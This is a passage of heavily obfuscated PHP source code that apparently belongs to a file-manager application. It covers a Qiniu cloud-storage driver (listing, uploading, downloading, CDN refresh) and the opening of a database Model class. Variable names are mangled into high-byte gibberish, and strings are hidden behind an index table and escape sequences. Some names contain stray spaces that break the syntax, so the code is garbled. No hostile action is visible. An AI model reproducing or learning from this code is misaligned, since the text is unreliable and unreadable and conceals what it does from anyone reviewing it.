$–ÔŒ…ğ˜ = empty($—ÑÛ±œ¬) && $—ÑÛ±œ¬ !== $„Œ‹ÎîÒ[239] ? $„Œ‹ÎîÒ[22] : $—ÑÛ±œ¬ . $„Œ‹ÎîÒ[18]; $û¸İ‹’ = $„Œ‹ÎîÒ[22]; $ŒÃå­ÏÆ = 500; $ûòèÛ´ = $„Œ‹ÎîÒ[18]; $×ƒŞáİÌ = $ÓÁ™áûÃ = 0; while (!0) { check_abort(); list($¡ºâ˜¦á, $°Š¨…€) = $this->bucketManager->listFiles($this->bucket, $–ÔŒ…ğ˜, $û¸İ‹’, $ŒÃå­ÏÆ, $ûòèÛ´); if ($°Š¨…€) { break; } $û¸İ‹’ = array_key_exists($„Œ‹ÎîÒ[1523], $¡ºâ˜¦á) ? $û¸İ‹’ = $¡ºâ˜¦á[$„Œ‹ÎîÒ[1578]] : $„Œ‹ÎîÒ[22]; if ($‡çÍÆ·Ñ) { if (!empty($¡ºâ˜¦á[$„Œ‹ÎîÒ[1579]])) { $×ƒŞáİÌ += count($¡ºâ˜¦á[$„Œ‹ÎîÒ[1579]]); } if (!empty($¡ºâ˜¦á[$„Œ‹ÎîÒ[1580]])) { $ÓÁ™áûÃ += count($¡ºâ˜¦á[$„Œ‹ÎîÒ[1580]]); } if ($û¸İ‹’ === $„Œ‹ÎîÒ[22]) { break; } continue; } if ($¤óûûÚ¶) { if (!empty($¡ºâ˜¦á[$„Œ‹ÎîÒ[1579]])) { return !0; } } else { if (!empty($¡ºâ˜¦á[$„Œ‹ÎîÒ[1580]])) { return !0; } } if ($û¸İ‹’ === $„Œ‹ÎîÒ[22]) { break; } } if ($‡çÍÆ·Ñ) { return array($„Œ‹ÎîÒ[250] => $×ƒŞáİÌ, $„Œ‹ÎîÒ[251] => $ÓÁ™áûÃ); } return !1; } public function listAll($ûˆÊ„‡) { $²˜ÈäÊ =& $_SERVER[‰‰Ş‚€]; $¡˜íÌĞ = $this->fileList($ûˆÊ„‡, $²˜ÈäÊ[22], !0); $î£ö€õ“ = array_to_keyvalue($¡˜íÌĞ[$²˜ÈäÊ[96]], $²˜ÈäÊ[42]); foreach ($¡˜íÌĞ[$²˜ÈäÊ[95]] as $š×Ìç¶½) { if (is_string($š×Ìç¶½)) { $î£ö€õ“[$š×Ìç¶½] = array($²˜ÈäÊ[89] => 0); } } return $this->listAllFiles($ûˆÊ„‡, $î£ö€õ“); } private function fileList($²‘“±‡â, $şˆ‘£ = '', $çŸ‡ôÁõ = 0) { $¢Ÿ§º½ =& $_SERVER[‰‰Ş‚€]; $²‘“±‡â = trim($²‘“±‡â, $¢Ÿ§º½[18]); $çÉ¬ŠŸç = empty($²‘“±‡â) && $²‘“±‡â !== $¢Ÿ§º½[239] ? $¢Ÿ§º½[22] : $²‘“±‡â . $¢Ÿ§º½[18]; $ú‘ß™²é = $¢Ÿ§º½[22]; $Ï„Ê™÷ = 1000; $ÔÂÀö = $ª™„íÊ = array(); while (!0) { check_abort(); list($îÎ‹î‚, $Š±çƒ½â) = $this->bucketManager->listFiles($this->bucket, $çÉ¬ŠŸç, $ú‘ß™²é, $Ï„Ê™÷, $şˆ‘£); if ($Š±çƒ½â) { break; } $ú‘ß™²é = array_key_exists($¢Ÿ§º½[1523], $îÎ‹î‚) ? $ú‘ß™²é = $îÎ‹î‚[$¢Ÿ§º½[1578]] : $¢Ÿ§º½[22]; $€à§¯÷™ = isset($îÎ‹î‚[$¢Ÿ§º½[1579]]) ? $îÎ‹î‚[$¢Ÿ§º½[1579]] : array(); $¦Š’´ ´ = isset($îÎ‹î‚[$¢Ÿ§º½[1580]]) ? $îÎ‹î‚[$¢Ÿ§º½[1580]] : array(); foreach ($€à§¯÷™ as $Î‘ïú¨â) { if ($Î‘ïú¨â[$¢Ÿ§º½[105]] == $çÉ¬ŠŸç) { continue; } $»Å´÷®¦ = $Î‘ïú¨â[$¢Ÿ§º½[105]]; $’¨˜Ôƒì = $Î‘ïú¨â[$¢Ÿ§º½[1576]]; $Î‘ïú¨â[$¢Ÿ§º½[42]] = $»Å´÷®¦; $Î‘ïú¨â[$¢Ÿ§º½[89]] = $’¨˜Ôƒì; $º÷œ­¥Î = $’¨˜Ôƒì == 0 && substr($»Å´÷®¦, strlen($»Å´÷®¦) - 1, 1) == $¢Ÿ§º½[18] ? !0 : !1; $this->cacheMethodInfoSet($»Å´÷®¦, $º÷œ­¥Î, $Î‘ïú¨â); if ($º÷œ­¥Î) { $ÔÂÀö[] = $»Å´÷®¦; continue; } $ª™„íÊ[] = $çŸ‡ôÁõ ? $Î‘ïú¨â : $»Å´÷®¦; } foreach ($¦Š’´ ´ as $»Å´÷®¦) { if ($»Å´÷®¦ == $çÉ¬ŠŸç) { continue; } $ÔÂÀö[] = $»Å´÷®¦; $this->cacheMethodInfoSet($»Å´÷®¦, !0); } if ($ú‘ß™²é === $¢Ÿ§º½[22]) { break; } } $this->cacheMethodInfoSet($²‘“±‡â, !0); return array($¢Ÿ§º½[95] => $ÔÂÀö, $¢Ÿ§º½[96] => $ª™„íÊ); } public function canRead($†»™ö«´) { return $this->exist($†»™ö«´) ? !0 : !1; } public function canWrite($¯Ğèš–÷) { return $this->exist($¯Ğèš–÷) ? !0 : !1; } public function getContent($¦¾Ïƒ·) { return $this->fileSubstr($¦¾Ïƒ·, 0, -1); } public function setContent($ß®ÌÊ±ü, $³şñÏò· = '') { $µ¢ö¡ëÊ = $this->tempFile($this->pathThis($ß®ÌÊ±ü)); file_put_contents($µ¢ö¡ëÊ, $³şñÏò·); if ($this->upload($ß®ÌÊ±ü, $µ¢ö¡ëÊ)) { $this->tempFileRemve($µ¢ö¡ëÊ); return !0; } return !1; } public function refreshUrls($°ä¹ê»º) { $¾‘ìğÜ =& $_SERVER[‰‰Ş‚€]; $¢ÚğùÅê = array(); if (is_array($°ä¹ê»º)) { foreach ($°ä¹ê»º as $›²å•¢®) { $¢ÚğùÅê[] = $this->link($›²å•¢®); } } else { $¢ÚğùÅê[] = $this->link($°ä¹ê»º); } $˜¼´Ë¾ç = new Qiniu\Cdn\CdnManager($this->auth); list($Ì‹Çı‰ß, $¡ƒÂ ²¼) = $˜¼´Ë¾ç->refreshUrls($¢ÚğùÅê); if ($¡ƒÂ ²¼) { return !1; } return $Ì‹Çı‰ß[$¾‘ìğÜ[1303]] == $¾‘ìğÜ[856] ? !0 : !1; } public function fileSubstr($ËâØ‚û­, $º‚¸Ä•—, $õİÚĞ›) { $ô›Õ“Èú =& $_SERVER[‰‰Ş‚€]; if (!($çã‡¤ô« = $this->link($ËâØ‚û­))) { return !1; } $¾•ÕÖ€¡ = !1; if ($õİÚĞ› > 0) { $´³åÀÙå = $º‚¸Ä•— + $õİÚĞ› - 1; $¾•ÕÖ€¡ = array($ô›Õ“Èú[1581] . $º‚¸Ä•— . $ô›Õ“Èú[481] . $´³åÀÙå); } $Ş›Í–¿ş = url_request($çã‡¤ô«, $ô›Õ“Èú[1542], !1, $¾•ÕÖ€¡); return $Ş›Í–¿ş[$ô›Õ“Èú[846]] ? $Ş›Í–¿ş[$ô›Õ“Èú[1326]] : !1; } public function upload($øìŒ™ĞÙ, $üøâÌ¬à, $£Üî­÷Š = false, $·º˜Ûƒó = REPEAT_REPLACE) { $˜á¼´õ = new Qiniu\Storage\UploadManager(); $¥›¥ ½é = $this->auth->uploadToken($this->bucket, $øìŒ™ĞÙ); $ŸĞ×ß†Æ = get_file_mime(get_path_ext($üøâÌ¬à)); list($¼Ë­Ïç†, $„üó²îè) = $˜á¼´õ->putFile($¥›¥ ½é, $øìŒ™ĞÙ, $üøâÌ¬à, null, $ŸĞ×ß†Æ); return $„üó²îè ? !1 : $this->getPathOuter($øìŒ™ĞÙ); } public function uploadFormData($¸…õôã¨, $™È»Õ = 3600) { return $this->uploadToken($¸…õôã¨, $™È»Õ); } public function uploadMultiData($ÏÃ‡ß‚, $éó¦ãô© = 3600) { return $this->uploadToken($ÏÃ‡ß‚, $éó¦ãô©); } private function uploadToken($–øüŠ²³, $Àş®’¢ = 3600) { $ÙÜ¶½‰´ =& $_SERVER[‰‰Ş‚€]; $òÏ¢ï³é = $Àş®’¢; $ÑöĞŞßù = array($ÙÜ¶½‰´[1582] => $ÙÜ¶½‰´[1583]); $¸å¯½¾Ü = $–øüŠ²³; $ì¦‚–Ô = $this->auth->uploadToken($this->bucket, $¸å¯½¾Ü, $òÏ¢ï³é, $ÑöĞŞßù, !0); $‹â•µõ = empty($this->region) || $this->region == $ÙÜ¶½‰´[1584] ? $ÙÜ¶½‰´[22] : $ÙÜ¶½‰´[481] . $this->region; $¦çşÙ‘ = http_type() . "\72\x2f\57\x75\160\x6c\157\141\144{$‹â•µõ}\x2e\x71\x69\x6e\151\165\160\x2e\x63\157\155\x2f"; return array($ÙÜ¶½‰´[1585] => $ì¦‚–Ô, $ÙÜ¶½‰´[1586] => $¦çşÙ‘); } public function download($¤à¢˜†­, $ô¯éÏ†ì) { $™Œ­ç„å = IO::getPathInner(IO::mkfile($ô¯éÏ†ì)); if (!($ƒÒÉƒº˜ = $this->link($¤à¢˜†­))) { return !1; } $ÆôÆğó€ = 0; $¬ò¾ÚªÆ = 1024 * 200; $âÆÄ™î = fopen($™Œ­ç„å, $_SERVER[‰‰Ş‚€][1587]); while (!0) { $ì¶¶åş = $this->fileSubstr($¤à¢˜†­, $ÆôÆğó€, $¬ò¾ÚªÆ); if ($ì¶¶åş === !1) { return !1; } fwrite($âÆÄ™î, $ì¶¶åş); $ÆôÆğó€ += $¬ò¾ÚªÆ; if (strlen($ì¶¶åş) < $¬ò¾ÚªÆ) { break; } } fclose($âÆÄ™î); return $ô¯éÏ†ì; } public function link($›³­©µƒ, $„ğ¿¦‹å = '') { if (!$this->isFile($›³­©µƒ)) { return !1; } $·ªï£Å• = $this->getHost() . $_SERVER[‰‰Ş‚€][18] . $this->pathEncode($›³­©µƒ) . $„ğ¿¦‹å; return $this->auth->privateDownloadUrl($·ªï£Å•, 3600 * 12); } public function fileOut($ù’È“Ôğ, $ö›İé‰¾ = false, $âµ×Ë„Î = false, $ ¬è•¥ = '') { $ı›’• =& $_SERVER[‰‰Ş‚€]; if ($this->isFileOutServer()) { return $this->fileOutServer($ù’È“Ôğ, $ö›İé‰¾, $âµ×Ë„Î, $ ¬è•¥); } if (!$âµ×Ë„Î) { $âµ×Ë„Î = $this->pathThis($ù’È“Ôğ); } $¿¯’Îô¡ = $ö›İé‰¾ ? $ı›’•[1588] . rawurlencode($âµ×Ë„Î) : $ı›’•[22]; $±ûÚ‡Úò = $this->link($ù’È“Ôğ, $¿¯’Îô¡); $this->fileOutLink($±ûÚ‡Úò); } public function fileOutServer($¡ıü±‡Ş, $ª¤òù¦« = false, $Úéê“Ú§ = false, $¥Ö˜ïƒç = '') { parent::fileOut($¡ıü±‡Ş, $ª¤òù¦«, $Úéê“Ú§, $¥Ö˜ïƒç); } public function fileOutImage($Åè´¨’¿, $„÷Íè“Ã = 250) { if ($this->size($Åè´¨’¿) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Åè´¨’¿, $„÷Íè“Ã); } $›¶Ë…Å = $this->link($Åè´¨’¿, $_SERVER[‰‰Ş‚€][1589] . $„÷Íè“Ã); $this->fileOutLink($›¶Ë…Å); } public function fileOutImageServer($¦ÜğÎõê, $¤ï‡…Ù¢ = 250) { parent::fileOutImage($¦ÜğÎõê, $¤ï‡…Ù¢); } public function hashMd5($’£±ûê) { $×ºäç¸ =& $_SERVER[‰‰Ş‚€]; $–ç™’ğâ = $this->objectMeta($’£±ûê); return isset($–ç™’ğâ[$×ºäç¸[256]]) ? $–ç™’ğâ[$×ºäç¸[256]] : !1; $¸ÜˆÜã = $this->link($’£±ûê, $×ºäç¸[1590]); } public function size($ÔåšÊ·ü) { $¹£ÛÇŸ÷ = $this->objectMeta($ÔåšÊ·ü); return $¹£ÛÇŸ÷ ? $¹£ÛÇŸ÷[$_SERVER[‰‰Ş‚€][89]] : 0; } public function info($ÀŒ„‰ïğ) { if ($this->isFolder($ÀŒ„‰ïğ)) { return $this->folderInfo($ÀŒ„‰ïğ); } else { if ($this->isFile($ÀŒ„‰ïğ)) { return $this->fileInfo($ÀŒ„‰ïğ); } } return !1; } public function exist($ç¥ùƒİ) { return $this->isFile($ç¥ùƒİ) || $this->isFolder($ç¥ùƒİ); } public function isFile($•üÛñÚ) { return !$this->isFolder($•üÛñÚ) && $this->objectMeta($•üÛñÚ); } public function isFolder($ğ³¼âÚ) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][188], $ğ³¼âÚ); } protected function objectMeta($ñ¾¨öÂæ) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][190], $ñ¾¨öÂæ); } protected function _objectMeta($ˆ…¬°) { $Ó¶î™ÚÂ =& $_SERVER[‰‰Ş‚€]; list($èÎì±ÒÊ, $»İã¢¡ä) = $this->bucketManager->stat($this->bucket, $ˆ…¬°); if ($èÎì±ÒÊ) { $èÎì±ÒÊ[$Ó¶î™ÚÂ[89]] = intval($èÎì±ÒÊ[$Ó¶î™ÚÂ[1576]]); } return $èÎì±ÒÊ; } protected function _isFolder($İ„É˜²ö) { $€Ÿİ‚‚ì =& $_SERVER[‰‰Ş‚€]; if ($İ„É˜²ö == $€Ÿİ‚‚ì[22] || $İ„É˜²ö == $€Ÿİ‚‚ì[18]) { return !0; } list($¶È°Êë‚, $Œ÷ûœÍ¨) = $this->bucketManager->listFiles($this->bucket, trim($İ„É˜²ö, $€Ÿİ‚‚ì[18]) . $€Ÿİ‚‚ì[18], $€Ÿİ‚‚ì[22], 1, $€Ÿİ‚‚ì[18]); return !empty($¶È°Êë‚[$€Ÿİ‚‚ì[1579]]) || !empty($¶È°Êë‚[$€Ÿİ‚‚ì[1580]]) ? !0 : !1; } } goto e†¥œ“¨ğ; FÏâø›•¦: define($_SERVER[‰‰Ş‚€][330], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\157\x72\144\x65\162", "\x61\x6c\x69\141\163", "\150\x61\166\x69\156\x67", "\x67\162\157\x75\x70", "\154\x6f\x63\153", "\144\151\x73\x74\x69\x6e\x63\x74", "\141\x75\164\157", "\x66\x69\x6c\164\145\162", "\166\141\154\x69\144\141\164\145", "\x72\145\163\x75\x6c\164", "\x62\151\156\144", "\164\157\153\x65\156"); public function __construct($‚¦“éã = '', $óø­üÓÕ = '', $´ì­ƒ¯ = '') { $ì€ôîõ =& $_SERVER[‰‰Ş‚€]; $this->_initialize(); if (!empty($‚¦“éã)) { if (strpos($‚¦“éã, $ì€ôîõ[20])) { list($this->dbName, $this->name) = explode($ì€ôîõ[20], $‚¦“éã); } else { $this->name = $‚¦“éã; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($óø­üÓÕ)) { $this->tablePrefix = $ì€ôîõ[22]; } elseif ($ì€ôîõ[22] != $óø­üÓÕ) { $this->tablePrefix = $óø­üÓÕ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ì€ôîõ[331]); } $this->db(0, empty($this->connection) ? $´ì­ƒ¯ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÆĞÈ´™à =& $_SERVER[‰‰Ş‚€]; if (empty($this->fields)) { if (think_config($ÆĞÈ´™à[332])) { $­Õ¤ìßÉ = $this->dbName ? $this->dbName : think_config($ÆĞÈ´™à[333]); $¶û÷İÈ® = think_var_cache($ÆĞÈ´™à[334] . strtolower(get_path_this($­Õ¤ìßÉ) . $ÆĞÈ´™à[20] . $this->name)); if ($¶û÷İÈ®) { $ÔÓÅœü = think_config($ÆĞÈ´™à[335]); if (empty($ÔÓÅœü) || $¶û÷İÈ®[$ÆĞÈ´™à[336]] == $ÔÓÅœü) { $this->fields = $¶û÷İÈ®; return; } } } $this->flush(); } } public function flush() { $ÄÄà“ı´ =& $_SERVER[‰‰Ş‚€]; $this->db->setModel($this->name); $ËÎÑØ¹³ = $this->db->getFields($this->getTableName()); if (!$ËÎÑØ¹³) { return !1; } $this->fields = array_keys($ËÎÑØ¹³); $this->fields[$ÄÄà“ı´[337]] = !1; foreach ($ËÎÑØ¹³ as $çÀÃò => $áîÑá»„) { $³·æ¨½Ú[$çÀÃò] = $áîÑá»„[$ÄÄà“ı´[43]]; if ($áîÑá»„[$ÄÄà“ı´[49]]) { $this->fields[$ÄÄà“ı´[338]] = $çÀÃò; if ($áîÑá»„[$ÄÄà“ı´[52]]) { $this->fields[$ÄÄà“ı´[337]] = !0; } } } $this->fields[$ÄÄà“ı´[339]] = $³·æ¨½Ú; if (think_config($ÄÄà“ı´[335])) { $this->fields[$ÄÄà“ı´[336]] = think_config($ÄÄà“ı´[335]); } if (think_config($ÄÄà“ı´[332])) { $µû÷Ÿàš = $this->dbName ? $this->dbName : think_config($ÄÄà“ı´[333]); think_var_cache($ÄÄà“ı´[334] . strtolower(get_path_this($µû÷Ÿàš) . $ÄÄà“ı´[20] . $this->name), $this->fields); } } public function switchModel($³ÈÏ³¡•, $Ô¬øÛ© = array()) { $¶³ïÔö¹ =& $_SERVER[‰‰Ş‚€]; $‘ŸÛ¢¾ = ucwords(strtolower($³ÈÏ³¡•)) . $¶³ïÔö¹[340]; if (!class_exists($‘ŸÛ¢¾)) { think_exception($‘ŸÛ¢¾ . think_lang($¶³ïÔö¹[341])); } $this->_extModel = new $‘ŸÛ¢¾($this->name); if (!empty($Ô¬øÛ©)) { foreach ($Ô¬øÛ© as $£•ˆîñÉ) { $this->_extModel->setProperty($£•ˆîñÉ, $this->{$£•ˆîñÉ}); } } return $this->_extModel; } public function __set($¸•ƒ—»ß, $¢õğÓê­) { $this->data[$¸•ƒ—»ß] = $¢õğÓê­; } public function __get($†Àøõığ) { return isset($this->data[$†Àøõığ]) ? $this->data[$†Àøõığ] : null; } public function __isset($Éß¤äù) { return isset($this->data[$Éß¤äù]); } public function __unset($ÛµÈ¶Æ‘) { unset($this->data[$ÛµÈ¶Æ‘]); } public function __call($ŒóÕ†, $‚ë±‘’€) { $ƒÀ¿²¥ó =& $_SERVER[‰‰Ş‚€]; if (in_array(strtolower($ŒóÕ†), $this->methods, !0)) { $this->options[strtolower($ŒóÕ†)] = $‚ë±‘’€[0]; return $this; } elseif (in_array(strtolower($ŒóÕ†), array($ƒÀ¿²¥ó[342], $ƒÀ¿²¥ó[343], $ƒÀ¿²¥ó[344], $ƒÀ¿²¥ó[345], $ƒÀ¿²¥ó[346]), !0)) { $èÓõ·Ë© = isset($‚ë±‘’€[0]) ? $‚ë±‘’€[0] : $ƒÀ¿²¥ó[231]; $èÓõ·Ë© = $this->db->parseKey($èÓõ·Ë©); return $this->getField(strtoupper($ŒóÕ†) . $ƒÀ¿²¥ó[347] . $èÓõ·Ë© . $ƒÀ¿²¥ó[348] . $ŒóÕ†, $ƒÀ¿²¥ó[342]); } elseif (strtolower(substr($ŒóÕ†, 0, 5)) == $ƒÀ¿²¥ó[349]) { $èÓõ·Ë© = think_parse_name(substr($ŒóÕ†, 5)); $ƒ‹¡œÕÈ[$èÓõ·Ë©] = $‚ë±‘’€[0]; return $this->where($ƒ‹¡œÕÈ)->find(); } elseif (strtolower(substr($ŒóÕ†, 0, 10)) == $ƒÀ¿²¥ó[350]) { $á´üàÑ = think_parse_name(substr($ŒóÕ†, 10)); $ƒ‹¡œÕÈ[$á´üàÑ] = $‚ë±‘’€[0]; return $this->where($ƒ‹¡œÕÈ)->getField($‚ë±‘’€[1]); } elseif (isset($this->_scope[$ŒóÕ†])) { return $this->scope($ŒóÕ†, $‚ë±‘’€[0]); } elseif (method_exists($this, $ŒóÕ†)) { array_unshift($‚ë±‘’€, $ŒóÕ†); return call_user_func_array(array($this, $ƒÀ¿²¥ó[351]), $‚ë±‘’€); } else { return call_user_func_array(array(parent, $ŒóÕ†), $‚ë±‘’€); } } protected function call() { $Ìƒë =& $_SERVER[‰‰Ş‚€]; $–Ë±èÇ¬ = func_get_args(); $×îÑÕçÌ = array_shift($–Ë±èÇ¬); $´ëúêª = $×îÑÕçÌ; if (is_array($×îÑÕçÌ)) { $´ëúêª = $×îÑÕçÌ[1]; $×îÑÕçÌ = $×îÑÕçÌ[0]; } $ŸâşŠĞš = count($–Ë±èÇ¬) - 1; if (isset($–Ë±èÇ¬[$ŸâşŠĞš]) && $–Ë±èÇ¬[$ŸâşŠĞš] === $×îÑÕçÌ) { think_exception(__CLASS__ . $Ìƒë[14] . $×îÑÕçÌ . think_lang($Ìƒë[352])); return; } $–Ë±èÇ¬[] = $×îÑÕçÌ; if (method_exists($this, $Ìƒë[353])) { $”‘·…ÂÊ = call_user_func_array(array($this, $Ìƒë[354]), array($´ëúêª, $–Ë±èÇ¬)); if (!is_null($”‘·…ÂÊ) && $”‘·…ÂÊ !== !1) { return $”‘·…ÂÊ; } } $›³øû½Æ = call_user_func_array(array($this, $×îÑÕçÌ), $–Ë±èÇ¬); if (method_exists($this, $Ìƒë[355])) { $”‘·…ÂÊ = call_user_func_array(array($this, $Ìƒë[356]), array($´ëúêª, $–Ë±èÇ¬, $›³øû½Æ)); if ($”‘·…ÂÊ) { return $”‘·…ÂÊ; } } return $›³øû½Æ; } protected function _initialize() { } protected function _facade($ı¿ê¦É–) { $®ûü‡ˆÎ =& $_SERVER[‰‰Ş‚€]; if (!empty($this->fields)) { foreach ($ı¿ê¦É– as $óØôŞíû => $íåŸ»Áä) { if (is_array($this->fields) && !in_array($óØôŞíû, $this->fields, !0)) { unset($ı¿ê¦É–[$óØôŞíû]); } elseif (is_scalar($íåŸ»Áä)) { $this->_parseType($ı¿ê¦É–, $óØôŞíû); } } } if (!empty($this->options[$®ûü‡ˆÎ[357]])) { $ı¿ê¦É– = array_map($this->options[$®ûü‡ˆÎ[357]], $ı¿ê¦É–); unset($this->options[$®ûü‡ˆÎ[357]]); } $this->_beforeWrite($ı¿ê¦É–); return $ı¿ê¦É–; } protected function _beforeWrite(&$ÙİÒİà) { } public function add($ÃÙ”İˆ‘ = '', $®’“ƒò = array(), $®÷Ğ™¶ò = false) { if (empty($ÃÙ”İˆ‘)) { if (!empty($this->data)) { $ÃÙ”İˆ‘ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[‰‰Ş‚€][358]); return !1; } } $®’“ƒò = $this->_parseOptions($®’“ƒò); $ÃÙ”İˆ‘ = $this->_facade($ÃÙ”İˆ‘); if (!1 === $this->_beforeInsert($ÃÙ”İˆ‘, $®’“ƒò)) { return !1; } $Ÿ„äı–Å = $this->db->insert($ÃÙ”İˆ‘, $®’“ƒò, $®÷Ğ™¶ò); if (!1 !== $Ÿ„äı–Å) { $¸ÂÖï°® = $this->getLastInsID(); if ($¸ÂÖï°®) { $ÃÙ”İˆ‘[$this->getPk()] = $¸ÂÖï°®; $this->_after_insert($ÃÙ”İˆ‘, $®’“ƒò); return $¸ÂÖï°®; } $this->_after_insert($ÃÙ”İˆ‘, $®’“ƒò); } return $Ÿ„äı–Å; } protected function _beforeInsert(&$­“•…§¾, $Ä­ïıÕİ) { } protected function _after_insert($¦™–¾Ğ¸, $Äëæµ½­) { } public function addAll($š™¾Ì±·, $¡ºíûâ = array(), $–Õãà¾š = false) { $Á½áıšÊ =& $_SERVER[‰‰Ş‚€]; if (empty($š™¾Ì±·)) { $this->error = think_lang($Á½áıšÊ[358]); return !1; } $¡ºíûâ = $this->_parseOptions($¡ºíûâ); foreach ($š™¾Ì±· as $‘‰¥“±‚ => $‚¶€ñ¸Ê) { $š™¾Ì±·[$‘‰¥“±‚] = $this->_facade($‚¶€ñ¸Ê); } if (method_exists($this->db, $Á½áıšÊ[359])) { $–¹Ëû¬« = $this->db->insertAll($š™¾Ì±·, $¡ºíûâ, $–Õãà¾š); } else { $this->startTrans(); foreach ($š™¾Ì±· as $‘‰¥“±‚ => $‚¶€ñ¸Ê) { $–¹Ëû¬« = $this->db->insert($‚¶€ñ¸Ê, $¡ºíûâ, $–Õãà¾š); } $this->commit(); } if (!1 !== $–¹Ëû¬«) { $“éàıº = $this->getLastInsID(); if ($“éàıº) { return $“éàıº; } } return $–¹Ëû¬«; } public function selectAdd($ğ¼·­´‡ = '', $ŸÂĞŒû‹ = '', $îğ›ƒí = array()) { $Ù©¬æÓ‹ =& $_SERVER[‰‰Ş‚€]; $îğ›ƒí = $this->_parseOptions($îğ›ƒí); if (!1 === ($ÄØ²¡ë = $this->db->selectInsert($ğ¼·­´‡ ? $ğ¼·­´‡ : $îğ›ƒí[$Ù©¬æÓ‹[360]], $ŸÂĞŒû‹ ? $ŸÂĞŒû‹ : $this->getTableName(), $îğ›ƒí))) { $this->error = think_lang($Ù©¬æÓ‹[361]); return !1; } else { return $ÄØ²¡ë; } } public function save($õ²÷™Ä = '', $¥‡Ğ–»ª = array()) { $¥…ı¶¹‘ =& $_SERVER[‰‰Ş‚€]; if (empty($õ²÷™Ä)) { if (!empty($this->data)) { $õ²÷™Ä = $this->data; $this->data = array(); } else { $this->error = think_lang($¥…ı¶¹‘[358]); return !1; } } $õ²÷™Ä = $this->_facade($õ²÷™Ä); $¥‡Ğ–»ª = $this->_parseOptions($¥‡Ğ–»ª); $ ù³’Ù = $this->getPk(); if (!isset($¥‡Ğ–»ª[$¥…ı¶¹‘[362]])) { if (isset($õ²÷™Ä[$ ù³’Ù])) { $§˜àß˜ğ[$ ù³’Ù] = $õ²÷™Ä[$ ù³’Ù]; $¥‡Ğ–»ª[$¥…ı¶¹‘[362]] = $§˜àß˜ğ; unset($õ²÷™Ä[$ ù³’Ù]); } else { $this->error = think_lang($¥…ı¶¹‘[361]); return !1; } } if (is_array($¥‡Ğ–»ª[$¥…ı¶¹‘[362]]) && isset($¥‡Ğ–»ª[$¥…ı¶¹‘[362]][$ ù³’Ù])) { $õºÊáÁ = $¥‡Ğ–»ª[$¥…ı¶¹‘[362]][$ ù³’Ù]; } if (!1 === $this->_beforeUpdate($õ²÷™Ä, $¥‡Ğ–»ª)) { return !1; } $½—®æ€ó = $this->db->update($õ²÷™Ä, $¥‡Ğ–»ª); if (!1 !== $½—®æ€ó) { if (isset($õºÊáÁ)) { $õ²÷™Ä[$ ù³’Ù] = $õºÊáÁ; } $this->_afterUpdate($õ²÷™Ä, $¥‡Ğ–»ª); } return $½—®æ€ó; } protected function _beforeUpdate(&$¢Ä¥Å“, $ú·‚) { } protected function _afterUpdate($¤çÆ•Ñß, $¸È¯¥†²) { } public function delete($¬×›˜íè = array()) { $—ğ‘‘ãÙ =& $_SERVER[‰‰Ş‚€]; if (empty($¬×›˜íè) && empty($this->options[$—ğ‘‘ãÙ[362]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $²ü¯ƒÎ„ = $this->getPk(); if (is_numeric($¬×›˜íè) || is_string($¬×›˜íè)) { if (strpos($¬×›˜íè, $—ğ‘‘ãÙ[60])) { $ÉÂóÌ—Ü[$²ü¯ƒÎ„] = array($—ğ‘‘ãÙ[363], $¬×›˜íè); } else { $ÉÂóÌ—Ü[$²ü¯ƒÎ„] = $¬×›˜íè; } $this->options[$—ğ‘‘ãÙ[362]] = $ÉÂóÌ—Ü; } $¬×›˜íè = $this->_parseOptions(); if (is_array($¬×›˜íè[$—ğ‘‘ãÙ[362]]) && isset($¬×›˜íè[$—ğ‘‘ãÙ[362]][$²ü¯ƒÎ„])) { $‰ŞÆœ = $¬×›˜íè[$—ğ‘‘ãÙ[362]][$²ü¯ƒÎ„]; } $Ùóüêó = $this->db->delete($¬×›˜íè); if (!1 !== $Ùóüêó) { $àÊ ÷Å = array(); if (isset($‰ŞÆœ)) { $àÊ ÷Å[$²ü¯ƒÎ„] = $‰ŞÆœ; } $this->_after_delete($àÊ ÷Å, $¬×›˜íè); } return $Ùóüêó; } protected function _after_delete($ßöô¦ÙÍ, $Á‚ŸŠ‡­) { } public function select($âû¡ã¬¹ = array()) { $Õ³Ìôíˆ =& $_SERVER[‰‰Ş‚€]; if (is_string($âû¡ã¬¹) || is_numeric($âû¡ã¬¹)) { $™ˆŸˆò· = $this->getPk(); if (strpos($âû¡ã¬¹, $Õ³Ìôíˆ[60])) { $Ä”³·Ôä[$™ˆŸˆò·] = array($Õ³Ìôíˆ[363], $âû¡ã¬¹); } else { $Ä”³·Ôä[$™ˆŸˆò·] = $âû¡ã¬¹; } $this->options[$Õ³Ìôíˆ[362]] = $Ä”³·Ôä; } elseif (!1 === $âû¡ã¬¹) { $âû¡ã¬¹ = $this->_parseOptions(); return $Õ³Ìôíˆ[364] . $this->db->buildSelectSql($âû¡ã¬¹) . $Õ³Ìôíˆ[365]; } $âû¡ã¬¹ = $this->_parseOptions(); $¢ƒïõá  = $this->db->select($âû¡ã¬¹); if (!1 === $¢ƒïõá ) { return !1; } if (empty($¢ƒïõá )) { return null; } $this->_afterSelect($¢ƒïõá , $âû¡ã¬¹); return $¢ƒïõá ; } protected function _afterSelect(&$ÓöÊ’¦â, $ã¯Äáå­) { } public function buildSql($ÔãÁø¶ = array()) { $‹Æ€×Ëõ =& $_SERVER[‰‰Ş‚€]; $ÔãÁø¶ = $this->_parseOptions($ÔãÁø¶); return $‹Æ€×Ëõ[364] . $this->db->buildSelectSql($ÔãÁø¶) . $‹Æ€×Ëõ[365]; } public function optionsValue($Äï •ä = null) { if (is_null($Äï •ä)) { return $this->options; } elseif (is_array($Äï •ä)) { 